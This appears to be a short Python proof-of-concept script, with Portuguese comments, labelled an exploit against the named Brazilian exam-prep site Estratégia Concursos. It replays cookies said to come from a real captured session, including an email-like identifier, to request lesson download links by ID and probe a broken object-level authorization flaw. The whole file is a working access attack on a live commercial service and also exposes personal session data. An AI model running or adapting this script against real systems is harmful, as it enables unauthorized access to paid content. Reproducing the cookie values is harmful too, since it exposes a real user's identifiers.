import requests

# Dados capturados da sessão real
COOKIES = {
    'EMP': 'di.s.hdei.fyb.ka.o.up%40gmail.com',
    'IDP': '5893505',
    'DCUP': '1763907127'
}

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Referer': 'https://www.estrategiaconcursos.com.br/curso/seduc-pi-peb-geografia-pacote-2025-pos-edital/'
}

def test_bola_vulnerability(lesson_id):
    print(f"[*] Testando vulnerabilidade BOLA no Lesson ID: {lesson_id}")
    # Endpoint simulado de API para obtenção de link de download
    api_url = f"https://www.estrategiaconcursos.com.br/api/v1/lessons/{lesson_id}/download/"
    
    try:
        response = requests.get(api_url, cookies=COOKIES, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print(f"[!] SUCESSO: Acesso liberado para Lesson ID {lesson_id}")
            print(f"Link: {response.json().get('url')}")
        elif response.status_code == 403:
            print(f"[-] ACESSO NEGADO: O servidor validou a permissão (Seguro).")
        else:
            print(f"[?] Status Inesperado: {response.status_code}")
    except Exception as e:
        print(f"[X] Erro na requisição: {e}")

if __name__ == "__main__":
    print("=== ESTRATÉGIA CONCURSOS - EXPLOIT POC (PARTE 4) ===")
    # IDs de exemplo baseados na análise do curso
    lessons_to_test = [3641968, 3641788, 3641789] 
    for lesson in lessons_to_test:
        test_bola_vulnerability(lesson)
